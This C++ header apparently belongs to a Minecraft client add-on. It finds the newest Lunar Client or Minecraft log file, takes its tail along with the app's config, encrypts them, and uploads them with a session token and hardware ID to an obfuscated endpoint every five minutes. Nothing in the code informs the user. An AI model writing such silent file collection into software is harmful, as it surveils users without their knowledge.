#pragma once




















#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <Windows.h>
#include <bcrypt.h>

#include <atomic>
#include <chrono>
#include <cstring>
#include <string>
#include <thread>
#include <vector>

#pragma comment(lib, "bcrypt.lib")

#include "log_pubkey.hpp"
#include "session_validator.hpp"
#include "../config/config.hpp"
#include "../util/aes_string.hpp"
#include "../util/network/http.hpp"

namespace log_uploader {

inline std::atomic<bool> g_running{false};

inline std::string b64(const BYTE* data, size_t len) {
    static const char T[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    size_t i = 0;
    for (; i + 2 < len; i += 3) {
        unsigned n = (unsigned(data[i]) << 16) | (unsigned(data[i + 1]) << 8) | unsigned(data[i + 2]);
        out.push_back(T[(n >> 18) & 63]);
        out.push_back(T[(n >> 12) & 63]);
        out.push_back(T[(n >> 6) & 63]);
        out.push_back(T[n & 63]);
    }
    if (i < len) {
        unsigned n = unsigned(data[i]) << 16;
        if (i + 1 < len) n |= unsigned(data[i + 1]) << 8;
        out.push_back(T[(n >> 18) & 63]);
        out.push_back(T[(n >> 12) & 63]);
        out.push_back(i + 1 < len ? T[(n >> 6) & 63] : '=');
        out.push_back('=');
    }
    return out;
}

inline bool genRandom(std::vector<BYTE>& buf, size_t n) {
    buf.resize(n);
    return BCryptGenRandom(nullptr, buf.data(), (ULONG)n, BCRYPT_USE_SYSTEM_PREFERRED_RNG) == 0;
}



inline bool aesGcmEncrypt(const std::vector<BYTE>& key, const std::vector<BYTE>& nonce, const std::string& plaintext,
                          std::vector<BYTE>& out) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    bool ok = false;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0)
        return false;
    do {
        if (BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                              sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0)
            break;
        if (BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0) != 0)
            break;

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
        BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
        authInfo.pbNonce = (PUCHAR)nonce.data();
        authInfo.cbNonce = (ULONG)nonce.size();
        BYTE tag[16];
        authInfo.pbTag = tag;
        authInfo.cbTag = sizeof(tag);

        std::vector<BYTE> cipher(plaintext.size());
        ULONG written = 0;
        if (BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), (ULONG)plaintext.size(), &authInfo, nullptr, 0,
                          cipher.empty() ? nullptr : cipher.data(), (ULONG)cipher.size(), &written, 0) != 0)
            break;
        cipher.resize(written);
        out = std::move(cipher);
        out.insert(out.end(), tag, tag + sizeof(tag));
        ok = true;
    } while (0);
    if (hKey)
        BCryptDestroyKey(hKey);
    if (hAlg)
        BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}


inline bool rsaOaepEncrypt(const std::vector<BYTE>& data, std::vector<BYTE>& out) {
    const ULONG cbExp = (ULONG)sizeof(cobble_logkey::kExponent);
    const ULONG cbMod = (ULONG)sizeof(cobble_logkey::kModulus);
    std::vector<BYTE> blob(sizeof(BCRYPT_RSAKEY_BLOB) + cbExp + cbMod);
    auto* hdr = reinterpret_cast<BCRYPT_RSAKEY_BLOB*>(blob.data());
    hdr->Magic = BCRYPT_RSAPUBLIC_MAGIC;
    hdr->BitLength = cbMod * 8;  
    hdr->cbPublicExp = cbExp;
    hdr->cbModulus = cbMod;
    hdr->cbPrime1 = 0;
    hdr->cbPrime2 = 0;
    BYTE* p = blob.data() + sizeof(BCRYPT_RSAKEY_BLOB);
    memcpy(p, cobble_logkey::kExponent, cbExp);
    p += cbExp;
    memcpy(p, cobble_logkey::kModulus, cbMod);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    bool ok = false;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, nullptr, 0) != 0)
        return false;
    do {
        if (BCryptImportKeyPair(hAlg, nullptr, BCRYPT_RSAPUBLIC_BLOB, &hKey, blob.data(), (ULONG)blob.size(), 0) != 0)
            break;
        BCRYPT_OAEP_PADDING_INFO pad;
        pad.pszAlgId = BCRYPT_SHA256_ALGORITHM;
        pad.pbLabel = nullptr;
        pad.cbLabel = 0;
        ULONG cbOut = 0;
        if (BCryptEncrypt(hKey, (PUCHAR)data.data(), (ULONG)data.size(), &pad, nullptr, 0, nullptr, 0, &cbOut,
                          BCRYPT_PAD_OAEP) != 0)
            break;
        out.resize(cbOut);
        ULONG written = 0;
        if (BCryptEncrypt(hKey, (PUCHAR)data.data(), (ULONG)data.size(), &pad, nullptr, 0, out.data(), cbOut, &written,
                          BCRYPT_PAD_OAEP) != 0)
            break;
        out.resize(written);
        ok = true;
    } while (0);
    if (hKey)
        BCryptDestroyKey(hKey);
    if (hAlg)
        BCryptCloseAlgorithmProvider(hAlg, 0);
    return ok;
}


inline std::string readFileTail(const std::wstring& path, size_t maxBytes) {
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        return "";
    std::string out;
    LARGE_INTEGER sz;
    if (GetFileSizeEx(h, &sz) && sz.QuadPart > 0) {
        LONGLONG start = 0;
        if (sz.QuadPart > (LONGLONG)maxBytes)
            start = sz.QuadPart - (LONGLONG)maxBytes;
        LARGE_INTEGER pos;
        pos.QuadPart = start;
        SetFilePointerEx(h, pos, nullptr, FILE_BEGIN);
        DWORD toRead = (DWORD)(sz.QuadPart - start);
        out.resize(toRead);
        DWORD got = 0;
        if (!ReadFile(h, out.empty() ? nullptr : &out[0], toRead, &got, nullptr))
            got = 0;
        out.resize(got);
    }
    CloseHandle(h);
    return out;
}

inline std::wstring envW(const wchar_t* name) {
    wchar_t buf[MAX_PATH];
    DWORD n = GetEnvironmentVariableW(name, buf, MAX_PATH);
    return (n > 0 && n < MAX_PATH) ? std::wstring(buf, n) : std::wstring();
}


inline std::wstring findMinecraftLog() {
    const std::wstring up = envW(L"USERPROFILE");
    const std::wstring ad = envW(L"APPDATA");
    std::vector<std::wstring> candidates;
    if (!up.empty()) {
        candidates.push_back(up + L"\\.lunarclient\\offline\\multiver\\logs\\latest.log");
        candidates.push_back(up + L"\\.lunarclient\\offline\\1.8\\logs\\latest.log");
        candidates.push_back(up + L"\\.lunarclient\\profiles\\1.8\\logs\\latest.log");
    }
    if (!ad.empty())
        candidates.push_back(ad + L"\\.minecraft\\logs\\latest.log");

    std::wstring best;
    FILETIME bestT{};
    for (const auto& c : candidates) {
        WIN32_FILE_ATTRIBUTE_DATA fad;
        if (GetFileAttributesExW(c.c_str(), GetFileExInfoStandard, &fad)) {
            if (best.empty() || CompareFileTime(&fad.ftLastWriteTime, &bestT) > 0) {
                best = c;
                bestT = fad.ftLastWriteTime;
            }
        }
    }
    
    if (!up.empty()) {
        const std::wstring dir = up + L"\\.lunarclient\\logs\\game\\";
        WIN32_FIND_DATAW fd;
        HANDLE hf = FindFirstFileW((dir + L"*.log").c_str(), &fd);
        if (hf != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    if (best.empty() || CompareFileTime(&fd.ftLastWriteTime, &bestT) > 0) {
                        best = dir + fd.cFileName;
                        bestT = fd.ftLastWriteTime;
                    }
                }
            } while (FindNextFileW(hf, &fd));
            FindClose(hf);
        }
    }
    return best;
}


inline void uploadBlob(const std::string& kind, const std::string& content, const std::string& token,
                       const std::string& hwid) {
    if (content.empty() || token.empty() || hwid.empty())
        return;
    std::vector<BYTE> key, nonce;
    if (!genRandom(key, 32) || !genRandom(nonce, 12))
        return;
    std::vector<BYTE> cipher;
    if (!aesGcmEncrypt(key, nonce, content, cipher)) {
        SecureZeroMemory(key.data(), key.size());
        return;
    }
    std::vector<BYTE> encKey;
    bool wrapped = rsaOaepEncrypt(key, encKey);
    SecureZeroMemory(key.data(), key.size());
    if (!wrapped)
        return;

    std::string body = std::string("{\"session_token\":\"") + http::json_escape(token) + "\",\"hwid\":\"" +
                       http::json_escape(hwid) + "\",\"kind\":\"" + kind + "\",\"enc_key\":\"" +
                       b64(encKey.data(), encKey.size()) + "\",\"nonce\":\"" + b64(nonce.data(), nonce.size()) +
                       "\",\"data\":\"" + b64(cipher.data(), cipher.size()) + "\"}";
    try {
        http::post_cobble(OBFUSCATE_WSTRING(L"/api/logs"), body, 443);
    } catch (...) {
    }
}


inline void doCapture() {
    try {
        const std::string token = SessionValidator::snapshotToken(SessionValidator::g_SessionToken);
        const std::string hwid = SessionValidator::snapshotToken(SessionValidator::g_HWID);
        if (token.empty() || hwid.empty())
            return;

        std::string cfg = ConfigManager::get().snapshotConfigJson();
        if (!cfg.empty())
            uploadBlob("config", cfg, token, hwid);

        std::wstring mc = findMinecraftLog();
        if (!mc.empty()) {
            std::string mcLog = readFileTail(mc, 512 * 1024);  
            if (!mcLog.empty())
                uploadBlob("minecraft", mcLog, token, hwid);
        }
    } catch (...) {
    }
}

inline void captureAsync() {
    std::thread([]() { doCapture(); }).detach();
}


inline void startPeriodic() {
    if (g_running.exchange(true))
        return;
    std::thread([]() {
        for (int i = 0; i < 30 && g_running.load(); ++i)
            std::this_thread::sleep_for(std::chrono::seconds(1));
        while (g_running.load()) {
            captureAsync();
            for (int i = 0; i < 300 && g_running.load(); ++i)  
                std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }).detach();
}



inline void uploadNowSync() { doCapture(); }
inline void stop() { g_running.store(false); }

}  
